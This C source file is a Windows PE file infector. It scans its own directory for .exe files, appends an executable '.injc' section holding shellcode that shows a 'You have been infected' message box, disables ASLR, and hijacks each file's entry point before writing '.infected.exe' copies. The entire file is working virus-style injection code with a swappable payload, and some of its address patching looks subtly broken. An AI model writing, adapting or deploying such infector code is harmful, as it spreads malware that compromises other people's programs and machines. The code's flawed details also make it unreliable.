#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Shellcode 
static unsigned char shellcode_template[] = {
    0x60,                   // pushad
    // push uType = MB_OK | MB_ICONWARNING (0x31)
    0x6A, 0x31,
    // push offset caption 
    0x68, 0,0,0,0,
    // push offset text 
    0x68, 0,0,0,0,
    // push hWnd = NULL
    0x6A, 0x00,
    // call MessageBoxA 
    0xE8, 0,0,0,0,
    0x61,                   // popad
    // jmp back to original entry point 
    0xE9, 0,0,0,0
};

// Injects shellcode into a single 32-bit PE file
int inject_file(const char* targetPath) {
    FILE* f = fopen(targetPath, "rb");
    if (!f) { fprintf(stderr, "Cannot open %s\n", targetPath); return 1; }
    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) { fprintf(stderr, "Memory alloc failed\n"); fclose(f); return 1; }
    fread(buffer, 1, fileSize, f);
    fclose(f);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(buffer + dos->e_lfanew);
    IMAGE_FILE_HEADER* fh = &nt->FileHeader;
    IMAGE_OPTIONAL_HEADER* oh = &nt->OptionalHeader;

    if (oh->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        fprintf(stderr, "%s is not a 32-bit PE\n", targetPath);
        free(buffer);
        return 1;
    }

    // Disable ASLR
    oh->DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    DWORD oldOEP    = oh->AddressOfEntryPoint;
    DWORD imageBase = oh->ImageBase;

    IMAGE_SECTION_HEADER* secs = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);
    IMAGE_SECTION_HEADER* last = &secs[fh->NumberOfSections - 1];

    DWORD fileAlign = oh->FileAlignment;
    DWORD secAlign  = oh->SectionAlignment;
    DWORD shellSize = sizeof(shellcode_template);

    DWORD newVA  = ((last->VirtualAddress + last->Misc.VirtualSize + secAlign - 1) / secAlign) * secAlign;
    DWORD newRaw = ((last->PointerToRawData + last->SizeOfRawData + fileAlign - 1) / fileAlign) * fileAlign;

    // Caption and text
    const char* cap = "Alert";
    const char* txt = "You have been infected";
    DWORD capLen = (DWORD)strlen(cap) + 1;
    DWORD txtLen = (DWORD)strlen(txt) + 1;

    IMAGE_SECTION_HEADER ns = {0};
    memcpy(ns.Name, ".injc", 5);
    ns.VirtualAddress   = newVA;
    ns.Misc.VirtualSize = shellSize + capLen + txtLen;
    ns.PointerToRawData = newRaw;
    ns.SizeOfRawData    = ((ns.Misc.VirtualSize + fileAlign - 1) / fileAlign) * fileAlign;
    ns.Characteristics  = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // Expand buffer and re-read headers
    buffer = (BYTE*)realloc(buffer, newRaw + ns.SizeOfRawData);
    dos = (IMAGE_DOS_HEADER*)buffer;
    nt  = (IMAGE_NT_HEADERS*)(buffer + dos->e_lfanew);
    fh  = &nt->FileHeader;
    oh  = &nt->OptionalHeader;
    secs = (IMAGE_SECTION_HEADER*)((BYTE*)&nt->OptionalHeader + fh->SizeOfOptionalHeader);

    // Insert section
    secs[fh->NumberOfSections] = ns;
    fh->NumberOfSections++;
    oh->SizeOfImage = newVA + ns.SizeOfRawData;

    // Copy shellcode + strings
    BYTE* data = buffer + newRaw;
    DWORD offsCap = shellSize;
    DWORD offsTxt = offsCap + capLen;
    memcpy(data, shellcode_template, shellSize);
    memcpy(data + offsCap, cap, capLen);
    memcpy(data + offsTxt, txt, txtLen);

    // Patch values
    #define PATCH4(addr, val) (*(DWORD*)(addr) = (DWORD)(val))
    PATCH4(data + 4, newVA + offsCap);
    PATCH4(data + 9, newVA + offsTxt);
    for (DWORD i = 0; i < shellSize - 5; i++) {
        if (data[i] == 0xE8) {
            DWORD callAddr = imageBase + newVA + i;
            DWORD msgAddr  = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
            DWORD delta    = msgAddr - (callAddr + 5);
            PATCH4(data + i + 1, delta);
            break;
        }
    }
    for (DWORD i = 0; i < shellSize - 5; i++) {
        if (data[i] == 0xE9) {
            DWORD jmpAddr = imageBase + newVA + i;
            DWORD rel     = (imageBase + oldOEP) - (jmpAddr + 5);
            PATCH4(data + i + 1, rel);
            break;
        }
    }
    #undef PATCH4

    // Redirect entry point
    oh->AddressOfEntryPoint = newVA;

    // Write out
    char outPath[MAX_PATH];
    snprintf(outPath, MAX_PATH, "%s.infected.exe", targetPath);
    FILE* o = fopen(outPath, "wb");
    if (!o) { fprintf(stderr, "Cannot write %s\n", outPath); free(buffer); return 1; }
    fwrite(buffer, 1, newRaw + ns.SizeOfRawData, o);
    fclose(o);
    free(buffer);

    printf("Injected %s -> %s\n", targetPath, outPath);
    return 0;
}

int main(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    // Trim to parent directory
    char* slash = strrchr(exePath, '\\');
    if (slash) *slash = '\0';
    // Build search pattern for parent directory
    char searchPattern[MAX_PATH];
    snprintf(searchPattern, MAX_PATH, "%s\\*.exe", exePath);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(searchPattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        printf("No .exe files found in parent directory: %s\n", exePath);
        return 0;
    }
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            _stricmp(fd.cFileName, strrchr(exePath, '\\')+1) != 0) {
            // Skip the injector itself
            inject_file(fd.cFileName);
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return 0;
}
